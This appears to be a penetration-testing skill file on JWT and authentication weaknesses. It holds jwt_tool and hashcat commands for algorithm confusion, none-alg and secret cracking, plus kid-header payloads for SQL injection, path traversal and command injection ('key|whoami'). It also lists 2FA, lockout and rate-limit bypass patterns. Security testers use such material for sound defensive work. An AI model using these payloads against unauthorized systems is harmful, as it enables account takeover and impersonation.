---
name: authentication_jwt
description: JWT and authentication vulnerability testing
applicable_contexts: [web, api, mobile]
---

## JWT & Authentication Testing

### JWT Attack Vectors

#### 1. Algorithm Confusion (RS256 → HS256)
Sign token with RS256 public key as HS256 secret:
```bash
jwt_tool TOKEN -X k -pk public.pem
```

#### 2. None Algorithm Attack
```bash
jwt_tool TOKEN -X a
# Manually: set alg to "none", remove signature
```

#### 3. Weak Secret Brute-Force
```bash
jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt
# hashcat: hashcat -m 16500 TOKEN wordlist.txt
```

#### 4. Kid Header Injection
```
# SQL injection via kid
{"alg":"HS256","kid":"' UNION SELECT 'secret' --"}

# Path traversal via kid
{"alg":"HS256","kid":"../../dev/null"}
# Sign with empty string as key

# Command injection via kid
{"alg":"HS256","kid":"key|whoami"}
```

#### 5. Claim Manipulation
```bash
jwt_tool TOKEN -T  # tamper mode
# Change: sub, role, isAdmin, userId, email, exp, iss, aud
```

### Comprehensive JWT Scan

```bash
jwt_tool TARGET_JWT -t "https://TARGET/api/protected" \
  -rh "Authorization: Bearer CURRENT_JWT" -M at

# All attack modes:
# at = All Tests (algorithm confusion, injection, forgery)
```

### Authentication Bypass Patterns

- Default credentials: admin/admin, admin/password, test/test
- Password reset token predictability (timestamp, sequential)
- Email verification bypass (change email after verification)
- OAuth state parameter absence → CSRF in OAuth flow
- OAuth redirect_uri manipulation → token theft
- 2FA bypass: skip 2FA step, brute-force TOTP, reuse backup codes
- Account lockout bypass: IP rotation, distributed attempts
- Rate limiting bypass: add X-Forwarded-For, change case, add spaces

### Session Management

- Session fixation: set session cookie before auth, check if reused after
- Session hijacking: insecure cookie (no HttpOnly, no Secure, SameSite=None)
- Concurrent session: login on multiple devices, check if previous invalidated
- Session timeout: check idle and absolute timeout enforcement
- Logout: verify session actually invalidated server-side

### Token Lifecycle Issues

- Expired tokens still accepted (clock skew tolerance too large)
- Refresh token rotation not enforced
- Token revocation not implemented (JWT stateless problem)
- Token scope escalation (read-only token used for writes)

### Validation Requirements

- Show successful access to protected resource with manipulated/forged token
- Document exact token modification made
- Show HTTP request/response demonstrating privilege escalation
- If role manipulation: show accessing admin-only functionality
- Compare: normal token response vs. manipulated token response

### Business Impact

- Complete account takeover
- Privilege escalation to admin
- Mass impersonation of any user
- Bypass of payment/billing restrictions
- Regulatory compliance violation (unauthorized data access)
